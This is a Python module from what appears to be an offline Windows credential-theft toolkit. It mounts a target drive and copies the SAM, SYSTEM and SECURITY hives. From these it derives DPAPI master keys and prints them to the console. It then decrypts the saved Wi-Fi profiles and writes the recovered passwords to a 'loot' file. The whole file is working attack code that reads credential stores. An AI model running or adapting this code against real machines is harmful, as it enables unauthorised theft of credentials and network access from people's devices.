import subprocess
import shutil
import os
import time
import sqlite3
import tofu_lib.dpapi
import glob
# Modified version of the PyPyKatz function
# All credit for DPAPI-related functions goes to them
def get_all_wifi_settings_offline(path,dpapi_object):
		wifis = []
		for filename in glob.glob(path+'/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/**', recursive=True):
			if filename.endswith('.xml'):
				try:
					wifi = dpapi_object.decrypt_wifi_config_file(filename)
					wifis.append(wifi)
				except Exception as e:
					print(e)
					try:
						wifis.append(dpapi_object.parse_wifi_config_file(filename))
					except Exception as e:
						print(e)
					
					
		return wifis
		
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing loot file at 'tofu_loot/wifi.txt'")
		try:
			open("tofu_loot/wifi.txt","x").close()
		except FileExistsError:
			pass
		
		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			history_file = open("tofu_loot/wifi.txt","a")
			print("\n[=== GETTING WI-FI PASSWORDS ===]\n")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SECURITY","tofu_tmp/HASHDUMP_SECURITY")
			masterkeys = tofu_lib.dpapi.get_masterkeys("tofu_tmp/windows_filesystem", "tofu_tmp/HASHDUMP_SAM", "tofu_tmp/HASHDUMP_SYSTEM", "tofu_tmp/HASHDUMP_SECURITY")
			if masterkeys.masterkeys:
				print("[+] We have masterkeys!")
				for masterkey in masterkeys.masterkeys:
					print(f"-- MASTERKEY / {masterkey}")
			wifi_data = get_all_wifi_settings_offline("tofu_tmp/windows_filesystem",masterkeys)
			for entry in wifi_data:
				for data in entry:
					print(f"{data} : {entry[data]}")
					history_file.write(f"{data} : {entry[data]}\n")
				
						
			
				
					
					
		except Exception as open_error:
			print(f"[-] Error {open_error}")
		os.remove("tofu_tmp/HASHDUMP_SYSTEM")
		os.remove("tofu_tmp/HASHDUMP_SECURITY")
		os.remove("tofu_tmp/HASHDUMP_SAM")
		time.sleep(2)	
		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
